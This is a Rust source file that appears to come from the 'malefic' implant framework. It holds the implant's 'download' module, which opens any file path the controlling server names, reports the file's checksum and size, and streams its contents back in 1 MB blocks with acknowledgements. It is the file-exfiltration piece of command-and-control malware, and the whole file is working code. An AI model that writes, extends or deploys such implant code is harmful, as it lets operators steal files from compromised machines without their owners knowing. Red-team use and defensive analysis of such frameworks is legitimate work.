use crate::{check_field, check_request, Module, Result, TaskError, TaskResult};
use async_trait::async_trait;
use malefic_helper::common::filesys::check_sum;
use malefic_helper::debug;
use malefic_helper::protobuf::implantpb::DownloadResponse;
use malefic_helper::protobuf::implantpb::{spite::Body, Block};
use malefic_trait::module_impl;
use std::fs::{metadata, OpenOptions};
use std::io::Read;

pub struct Download {}

#[async_trait]
#[module_impl("download")]
impl Module for Download {
    async fn run(
        &mut self,
        id: u32,
        receiver: &mut crate::Input,
        sender: &mut crate::Output,
    ) -> Result {
        let request = check_request!(receiver, Body::DownloadRequest)?;
        let path: String = check_field!(request.path)?;
        let path_clone = path.clone();
        let mut file = OpenOptions::new().read(true).open(path_clone)?;

        let sum = check_sum(&path)?;
        let metadata = metadata(&path)?;
        let size = metadata.len();
        debug!("checksum: {}, size: {}", sum, size);
        let _ = sender
            .send(TaskResult::new_with_body(
                id,
                Body::DownloadResponse(DownloadResponse {
                    checksum: (sum),
                    size: (size),
                }),
            ))
            .await?;
        let ack = check_request!(receiver, Body::Ack)?;
        if !ack.success {
            return Err((TaskError::FieldInvalid {
                msg: "download server ack failed".to_string(),
            })
            .into());
        }

        let buffer_size = 1024 * 1024;
        let mut buffer = vec![0; buffer_size];
        let mut seq = 0;
        loop {
            let n = file.read(&mut buffer)?;
            let mut block = Block {
                block_id: seq,
                content: buffer[..n].to_vec(),
                end: n < buffer_size, // 如果读取的字节少于缓冲区大小，则这是最后一个块
            };
            if block.end {
                return Ok(TaskResult::new_with_body(id, Body::Block(block)));
            } else{
                let _ = sender.send(TaskResult::new_with_body(id, Body::Block(block))).await?;
                seq += 1;
            }
            check_request!(receiver, Body::Ack)?;
        }
    }
}
